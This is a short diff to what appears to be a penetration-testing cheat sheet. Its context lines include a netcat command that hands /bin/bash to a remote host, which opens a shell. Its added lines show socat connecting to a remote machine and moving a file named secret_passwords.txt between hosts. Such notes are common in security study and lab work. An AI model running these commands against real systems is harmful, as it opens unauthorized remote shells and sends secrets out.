@@ -29,3 +29,14 @@ nc -nv 10.11.0.22 4444
 nc -nlvp 4444
 nc -nv 10.11.0.22 4444 -e /bin/bash
 ```
+
+### Socat connect remote machine
+```
+socat - TCP4:ip-address:80
+```
+
+### Socat transfer files
+```
+sudo socat TCP4-LISTEN:443,fork file:secret_passwords.txt  
+socat TCP4:10.11.0.4:443 file:received_secret_passwords.txt,create
+```
